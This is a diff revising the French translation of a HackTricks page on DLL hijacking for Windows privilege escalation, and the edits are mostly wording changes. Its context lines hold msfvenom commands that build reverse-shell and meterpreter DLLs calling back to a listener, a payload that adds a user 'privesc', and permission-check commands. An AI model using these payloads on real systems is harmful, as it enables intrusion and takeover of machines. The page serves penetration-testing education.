@@ -12,7 +12,7 @@
 
 </details>
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
 Si vous êtes intéressé par une **carrière en piratage** et que vous voulez pirater l'impossible - **nous recrutons !** (_maîtrise du polonais écrit et parlé requise_).
 
@@ -22,7 +22,7 @@ Si vous êtes intéressé par une **carrière en piratage** et que vous voulez p
 
 Tout d'abord, clarifions la définition. Le détournement de DLL consiste, dans le sens le plus large, à **tromper une application légitime/fiable pour qu'elle charge une DLL arbitraire**. Les termes tels que _DLL Search Order Hijacking_, _DLL Load Order Hijacking_, _DLL Spoofing_, _DLL Injection_ et _DLL Side-Loading_ sont souvent -à tort- utilisés pour dire la même chose.
 
-Le détournement de DLL peut être utilisé pour **exécuter** du code, obtenir **une persistance** et **élever les privilèges**. Parmi ces 3 options, l'**élévation de privilèges** est de loin la moins probable à trouver. Cependant, comme cela fait partie de la section sur l'élévation de privilèges, je me concentrerai sur cette option. Notez également que, indépendamment de l'objectif, un détournement de DLL est effectué de la même manière.
+Le détournement de DLL peut être utilisé pour **exécuter** du code, obtenir **une persistance** et **élever les privilèges**. Parmi ces 3 options, **l'élévation de privilèges** est de loin la moins probable à trouver. Cependant, comme cela fait partie de la section sur l'élévation de privilèges, je me concentrerai sur cette option. Notez également que, indépendamment de l'objectif, un détournement de DLL est effectué de la même manière.
 
 ### Types
 
@@ -48,7 +48,7 @@ et affichez simplement l'**activité du système de fichiers** :
 ![](<../../.gitbook/assets/image (314).png>)
 
 Si vous recherchez des **DLL manquantes en général**, vous **laissez** cela s'exécuter pendant quelques **secondes**.\
-Si vous recherchez une **DLL manquante dans un exécutable spécifique**, vous devez définir **un autre filtre comme "Nom du processus" "contient" "\<nom de l'exécutable>", l'exécuter et arrêter la capture des événements**.
+Si vous recherchez une **DLL manquante dans un exécutable spécifique**, vous devez définir **un autre filtre comme "Nom du processus" "contient" "\<nom de l'exécutable>", l'exécuter, puis arrêter la capture des événements**.
 ## Exploitation des DLL manquantes
 
 Pour escalader les privilèges, notre meilleure chance est de pouvoir **écrire une DLL qu'un processus privilégié tentera de charger** dans un endroit où elle sera recherchée. Ainsi, nous pourrons **écrire** une DLL dans un **dossier** où la DLL est recherchée avant le dossier où se trouve la **DLL d'origine** (cas étrange), ou nous pourrons **écrire dans un dossier où la DLL sera recherchée** et où la **DLL d'origine n'existe pas** dans aucun dossier.
@@ -87,12 +87,12 @@ Il existe d'autres façons de modifier l'ordre de recherche, mais je ne vais pas
 **Prérequis** :
 
 * **Trouver un processus** qui s'exécute/va s'exécuter avec **d'autres privilèges** (mouvement horizontal/lateral) et qui **manque d'une DLL**.
-* Avoir **l'autorisation d'écriture** dans n'importe quel **dossier** où la DLL va être **recherchée** (probablement le répertoire de l'exécutable ou un dossier dans le chemin système).
+* Avoir **l'autorisation d'écriture** dans n'importe quel **dossier** où la DLL va être **recherchée** (probablement le répertoire de l'exécutable ou un dossier à l'intérieur du chemin système).
 
-Oui, les prérequis sont difficiles à trouver car **par défaut, il est assez étrange de trouver un exécutable privilégié manquant d'une DLL** et c'est encore **plus étrange d'avoir l'autorisation d'écriture dans un dossier du chemin système** (vous ne pouvez pas par défaut). Mais, dans des environnements mal configurés, cela est possible.\
-Dans le cas où vous avez de la chance et que vous vous trouvez dans cette situation, vous pouvez consulter le projet [UACME](https://github.com/hfiref0x/UACME). Même si l'**objectif principal du projet est de contourner l'UAC**, vous y trouverez peut-être une **preuve de concept** d'un détournement de DLL pour la version de Windows que vous pouvez utiliser (en changeant probablement le chemin du dossier où vous avez l'autorisation d'écriture).
+Oui, les prérequis sont difficiles à trouver car **par défaut, il est assez étrange de trouver un exécutable privilégié qui manque d'une DLL** et c'est encore **plus étrange d'avoir des autorisations d'écriture sur un dossier du chemin système** (vous ne pouvez pas par défaut). Mais, dans des environnements mal configurés, cela est possible.\
+Dans le cas où vous avez de la chance et que vous vous trouvez dans cette situation, vous pouvez consulter le projet [UACME](https://github.com/hfiref0x/UACME). Même si l'**objectif principal du projet est de contourner l'UAC**, vous pouvez y trouver une **preuve de concept** d'un détournement de DLL pour la version de Windows que vous pouvez utiliser (en changeant probablement le chemin du dossier où vous avez des autorisations d'écriture).
 
-Notez que vous pouvez **vérifier vos autorisations dans un dossier** en utilisant :
+Notez que vous pouvez **vérifier vos autorisations dans un dossier** en utilisant la commande suivante :
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
@@ -140,7 +140,7 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**Créer un utilisateur (je n'ai pas vu de version x64) :**
+**Créer un utilisateur (je n'ai pas vu de version x64):**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
@@ -227,9 +227,9 @@ break;
 return TRUE;
 }
 ```
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
-Si vous êtes intéressé par une **carrière de hacking** et souhaitez pirater l'impossible - **nous recrutons !** (_maîtrise du polonais à l'écrit et à l'oral requise_).
+Si vous êtes intéressé par une **carrière de hacking** et souhaitez pirater l'impossible - **nous recrutons !** (_maîtrise du polonais écrit et parlé requise_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -237,10 +237,10 @@ Si vous êtes intéressé par une **carrière de hacking** et souhaitez pirater 
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez vos astuces de hacking en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
